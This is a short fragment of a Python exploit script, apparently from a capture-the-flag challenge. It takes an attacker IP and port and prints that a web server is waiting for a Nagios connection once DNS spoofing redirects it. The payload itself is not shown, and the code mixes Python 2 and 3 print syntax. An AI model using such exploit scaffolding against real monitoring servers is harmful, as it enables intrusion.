...
if __name__ == "__main__":
    ...
    print(attacker_ip , "attacker")
    if len(sys.argv) == 3 :
	   attacker_port = sys.argv[2]
	   print(attacker_port, "port")
    else:
	   attacker_port = 8080
    ...
    print "[+] Web server ready for connection from Nagios (http://cha.hackpack.club:41714/). Time for your dnsspoof magic... ;)\n"
